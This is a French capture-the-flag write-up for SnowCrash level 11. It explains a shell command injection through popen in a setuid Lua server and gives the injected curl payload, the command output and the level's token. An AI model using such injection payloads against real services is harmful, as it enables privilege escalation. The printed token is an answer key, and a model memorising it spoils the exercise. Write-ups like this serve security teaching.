# LEVEL XI
```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
Executé avec les droits de flag11... mais que contient donc `level11.lua` ?
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept() -- Il s'agit d'un serveur web
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
	  -- En dessous de ce point il n'y a rien a exploiter
	  -- Que le hash soit correct ou non on n'aura pas plus d'info
	  -- L'exploit doit donc se trouver dans la fonction hash()
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
En faisant quelques tests en local pour se familiariser avec le Lua on comprend que la variable l est le paramètre de l'URL:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

while 1 do
  local client = server:accept()
  local l, err = client:receive() -- l = parametre de l'URL
  if not err then
      print("trying " .. l) -- concatenation de 2 strings
  end
  client:close()
end
```
```
/tmp >>> curl '127.0.0.1:5151'                                            
trying GET / HTTP/1.1
curl: (52) Empty reply from server
/tmp >>> curl '127.0.0.1:5151?test'                                   [52]
trying GET /?test HTTP/1.1
curl: (52) Empty reply from server
```

En revenant sur le programme principal on remarque l'appel à la `popen` dans la fonction `hash()`, permettant d'appeler le programme sha1sum du systeme.
```
hash($x) = `echo $x | sha1sum` 
```
On va s'en servir pour injecter une commande dans le pipe.
```
level11@SnowCrash:~$ curl '127.0.0.1:5151?coucou; getflag > /tmp/flag'
Password: Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
On a le flag, `fa6v5ateaw21peobuub8ipe6s` :tada:
